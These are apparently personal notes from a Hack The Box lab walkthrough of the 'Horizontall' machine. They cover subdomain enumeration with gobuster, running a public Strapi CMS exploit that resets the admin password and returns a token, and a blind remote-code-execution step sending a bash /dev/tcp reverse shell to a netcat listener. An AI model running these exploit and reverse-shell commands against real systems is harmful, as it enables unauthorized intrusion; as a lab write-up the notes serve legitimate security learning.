The website on horizontall.htb is static, only html files

Gobuster found a subdomain
```bash
$ /home/pachinko/go/bin/gobuster vhost -u horizontall.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -o subdomains.out  
===============================================================  
Gobuster v3.1.0  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:          http://horizontall.htb  
[+] Method:       GET  
[+] Threads:      100  
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  
[+] User Agent:   gobuster/3.1.0  
[+] Timeout:      10s  
===============================================================  
2021/09/21 18:49:34 Starting gobuster in VHOST enumeration mode  
===============================================================  
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]  
                                                           
===============================================================  
2021/09/21 18:58:05 Finished  
===============================================================
````

its running Strapi CMS as per wappalyzer
![[Pasted image 20210921190425.png]]

it has a known [exploit](https://www.exploit-db.com/exploits/50239)
```bash
$ python3 exploit.py http://api-prod.horizontall.htb  
[+] Checking Strapi CMS Version running  
[+] Seems like the exploit will work!!!  
[+] Executing exploit  
  
  
[+] Password reset was successfully  
[+] Your email is: admin@horizontall.htb  
[+] Your new credentials are: admin:SuperStrongPassword1  
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMyMjMxNDI4LCJleHAiOjE2MzQ4MjM0Mjh9.1fYCtG4_cac9J7dgyJTzMfv3vtvF1o412LWw  
IQd0joM

$> bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
[+] Triggering Remote code executin  
[*] Rember this is a blind RCE don't expect to see output  
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```

Got reverse shell with ```bash -c 'bash -i >/dev/tcp/ip/port 0>&1'```
```bash
$ nc -nvlp 9001  
Listening on 0.0.0.0 9001  
Connection received on 10.10.11.105 40204  
bash: cannot set terminal process group (1836): Inappropriate ioctl for device  
bash: no job control in this shell  
strapi@horizontall:~/myapi$
```

